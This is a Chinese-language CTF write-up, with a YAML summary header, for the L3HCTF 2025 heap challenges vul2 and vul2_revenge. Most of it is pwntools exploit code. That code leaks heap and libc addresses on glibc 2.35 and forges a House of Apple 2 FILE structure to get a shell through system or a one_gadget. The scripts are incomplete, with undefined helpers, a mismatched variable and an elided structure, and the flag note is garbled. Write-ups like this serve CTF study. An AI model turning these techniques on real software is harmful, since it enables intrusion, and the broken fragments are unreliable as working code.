---
title: L3HCTF 2025 Writeup (XMCVE-Polaris 战队 第 9 名)
contest: L3HCTF
year: 2025
difficulty: hard
vuln_type: pwn_unknown
tags: [House of Apple 2, fake_io, libc 2.35, vul2, vul2_revenge, XMCVE-Polaris]
attack_chain: |
  1. L3HCTF 2025 XMCVE-Polaris 战队排名第 9 (总分 7479.07)
  2. 排名靠前队伍: SU (11593) / Arr3stY0u (10705) / Lilac (9747) / N1STAR (8451)
  3. vul2 (libc 2.35 堆菜单 5/1/2/3/4/4869):
     - add(0xf, 0x8) + add(0xe, 0x8) + add(0xd, 0x430) + add(0xc, 0x8) + add(0xb, 0x8)
     - dele(0xc) + dele(0xd) + dele(0xe) 触发 unsorted bin
     - '4' 编辑模式 → '1' → payload = b'a'*0x103 + p8(0x17) + p16(0x529A) 改 size 触发 unlink
     - show(0x8) 泄 heap_base = u64(leak) - 0x750
     - add(1, 8, p64(heap)) 触发进一步 unlink → show(4) 泄 libc = u64(leak) - 0x203b20
     - stdout = libc + 0x2045c0, wfile_jump = libc + 0x202228
     - fake_io = flat({0x0: b' sh', 0x10: system, 0x20: stdout, 0x88: stdout-0x30, 0xa0: stdout, 0xd8: wfile_jump+0x48-0x38, 0xe0: stdout-8}, filler=b'\\x00')
     - House of Apple 2: 写 fake_io 到 stdout → 触发 _IO_wfile_overflow → system(" sh")
  4. vul2_revenge (off-by-null 触发 House of Apple 2):
     - add(0xf, 0x500) + add(0xe, 0x40) + add(0, 0x8)
     - dele(0xf) + add(0xf, 0x4e0) 触发 off-by-null 合并 0x500 块
     - dele(0xe) 触发 consolidate
     - '4' 编辑 + payload = b'a'*0x23 + p8(0x37) + p8(0x6a) 改 size
     - libc.address = u64(leak) - 0x203b20, fake_io 含 one_gadget 0x582d2
key_payload: |
  # vul2 House of Apple 2 模板 (libc 2.35):
  heapbase = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x750
  libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x203b20
  stdout = libc.address + 0x2045c0
  wfile_jump = libc.address + 0x202228
  fake_io = flat({
      0x0: b' sh',
      0x10: libc.symbols['system'],
      0x20: stdout,
      0x88: stdout - 0x30,
      0xa0: stdout,
      0xd8: wfile_jump + 0x48 - 0x38,
      0xe0: stdout - 8,
  }, filler=b'\x00')
  
  # vul2_revenge 攻击 (off-by-null):
  payload = b'a'*0x23 + p8(0x37) + p8(0x6a)
  one_gadget = libc.address + 0x582d2
one_liner: L3HCTF 2025 XMCVE-Polaris 战队的 vul2 / vul2_revenge 两道 libc 2.35 堆题，House of Apple 2 收尾。
lesson: |
  - libc 2.35 堆题 House of Apple 2 是收尾标配 (vtable = _IO_wfile_jumps, wide_data 指向自身)
  - 0x103 字节 padding + 0x17 + 0x529A 触发 off-by-null 是常见 pattern
  - vul2 5/1/2/3/4/4869 菜单: 5=set, 1=add, 2=delete, 3=show, 4=edit, 4869=l33t
  - vul2_revenge 0x500 + 0x40 + 0x8 堆块布局 + 改 size 0x37 触发 off-by-null
  - libc 2.35-0ubuntu3.8: stdout=0x2045c0, wfile_jump=0x202228, one_gadget=0x582d2
quality: high
---

# L3HCTF Writeup (L3HCTF 2025)

> 来源: ctfiot.com 262264 - XMCVE-Polaris 战队 第 9 名 (总分 7479.07)

## 排名

| 排名 | 队伍 | 总分 |
|------|------|------|
| 1 | SU | 11593.11 |
| 2 | Arr3stY0u | 10705.41 |
| 3 | Lilac | 9747.42 |
| 4 | N1STAR | 8451.15 |
| 5 | Spirit+ | 8300.47 |
| 9 | **XMCVE-Polaris** | 7479.07 |

## vul2 (libc 2.35 堆菜单)

```python
def add(idx, size, content=b'a'):
    p.sendlineafter('on: ', '1')
    p.sendlineafter('): ', str(idx))
    p.sendafter('): ', str(size))
    p.sendafter('nt: ', content)

p = process('./vul2')
libc = ELF('./lib/libc.so.6')
p.sendlineafter('> ', '5')  # 模式 5
add(0xf, 0x8)
add(0xe, 0x8)
add(0xd, 0x430)
add(0xc, 0x8)
add(0xb, 0x8)
dele(0xc)
dele(0xd)
dele(0xe)

p.sendlineafter('on: ', '4')  # edit 模式
p.sendlineafter('> ', '1')
payload = b'a'*0x103 + p8(0x17) + p16(0x529A)
p.sendline(payload)
show(0x8)
p.recvuntil('---\n')
heapbase = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x750

add(1, 8, p64(heap))
show(4)
p.recvuntil('---\n')
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x203b20

stdout = libc.address + 0x2045c0
wfile_jump = libc.address + 0x202228
fake_io = flat({
    0x0: b' sh',
    0x10: libc.symbols['system'],
    0x20: stdout,
    0x88: stdout - 0x30,
    0xa0: stdout,
    0xd8: wfile_jump + 0x48 - 0x38,
    0xe0: stdout - 8,
}, filler=b'\x00')

# 触发 House of Apple 2
add(2, 0x280, pay1)
add(1, 0x3f0, p64(0)*2 + fake_io)
p.interactive()
```

## vul2_revenge (off-by-null)

```python
add(0xf, 0x500)
add(0xe, 0x40)
add(0, 0x8)
dele(0xf)
add(0xf, 0x4e0)  # 触发 off-by-null 合并
dele(0xe)

p.sendlineafter('on: ', '4')
p.sendlineafter('> ', '1')
payload = b'a'*0x23 + p8(0x37) + p8(0x6a)  # 改 size
p.sendline(payload)

# 泄 libc + one_gadget 0x582d2
show(0x8)
heapbase = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x750 - 0x90 - 0x30
add(1, 0x40, p64(heapbase + 0x790))
show(0xc)
libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x203b20

# 同样 fake_io 收尾 (含 one_gadget 0x582d2 替代 system)
fake_io = flat({
    0x0: b' sh',
    0x10: libc.address + 0x582d2,  # one_gadget
    ...
})
```

## 加密备注

```
The content flag is come on little brave fox
Replace letter O with number zero letter L with one
Replace letter A with @
make free with e upcase
swap ? with  ? ? ?
```

— 出题人把 flag 内容里字母 O→0, L→1, A→@, e→E, ?→? ? ?

## 评价

L3HCTF 2025 XMCVE-Polaris 战队速查，2 道 libc 2.35 堆题都用 House of Apple 2 收尾。模板标准化程度高（fake_io 字段一致），适合作为"libc 2.35 堆题 House of Apple 2 模板"学习材料。
